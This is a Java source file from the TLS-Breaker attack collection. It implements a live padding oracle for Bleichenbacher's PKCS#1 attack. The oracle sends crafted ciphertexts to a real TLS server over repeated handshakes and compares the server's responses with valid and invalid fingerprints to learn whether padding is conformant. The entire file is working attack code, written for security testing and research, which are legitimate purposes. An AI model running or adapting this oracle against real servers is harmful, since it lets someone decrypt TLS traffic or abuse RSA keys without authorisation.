/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.attacks.pkcs1.oracles;

import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.Bits;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.util.MathHelper;
import de.rub.nds.tlsbreaker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
import de.rub.nds.tlsbreaker.attacks.pkcs1.BleichenbacherWorkflowType;
import de.rub.nds.tlsbreaker.attacks.util.response.EqualityError;
import de.rub.nds.tlsbreaker.attacks.util.response.FingerPrintChecker;
import de.rub.nds.tlsbreaker.attacks.util.response.ResponseExtractor;
import de.rub.nds.tlsbreaker.attacks.util.response.ResponseFingerprint;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;

/**
 *
 *
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config config;

    private final ResponseFingerprint validResponseContent;

    private final ResponseFingerprint invalidResponseContent;

    private final BleichenbacherWorkflowType type;

    /**
     *
     * @param pubKey
     * @param config
     * @param validResponseContent
     * @param invalidResponseContent
     * @param type
     */
    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, Config config, ResponseFingerprint validResponseContent,
        ResponseFingerprint invalidResponseContent, BleichenbacherWorkflowType type) {
        this.publicKey = (RSAPublicKey) pubKey;
        this.blockSize = MathHelper.intCeilDiv(publicKey.getModulus().bitLength(), Bits.IN_A_BYTE);
        this.validResponseContent = validResponseContent;
        this.invalidResponseContent = invalidResponseContent;
        this.type = type;
        this.config = config;
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        // we are initializing a new connection in every loop step, since most
        // of the known servers close the connection after an invalid handshake
        Config tlsConfig = config;
        tlsConfig.setWorkflowExecutorShouldClose(false);
        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, msg);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig().getWorkflowExecutorType(), state);

        numberOfQueries++;
        if (numberOfQueries % 1000 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        Boolean conform = false;
        try {
            workflowExecutor.executeWorkflow();
            ResponseFingerprint fingerprint = getFingerprint(state);
            clearConnections(state);
            if (fingerprint != null) {
                if (validResponseContent != null) {
                    conform = FingerPrintChecker.checkEquality(fingerprint, validResponseContent) == EqualityError.NONE;
                } else if (invalidResponseContent != null) {
                    conform =
                        FingerPrintChecker.checkEquality(fingerprint, invalidResponseContent) != EqualityError.NONE;
                }
            }

        } catch (WorkflowExecutionException e) {
            LOGGER.debug(e.getLocalizedMessage(), e);
        }
        return conform;
    }

    private ResponseFingerprint getFingerprint(State state) {
        if (state.getWorkflowTrace().allActionsExecuted()) {
            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(state);
            return fingerprint;
        } else {
            LOGGER.debug(
                "Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        return null;
    }

    private void clearConnections(State state) {
        try {
            state.getTlsContext().getTransportHandler().closeConnection();
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }
}
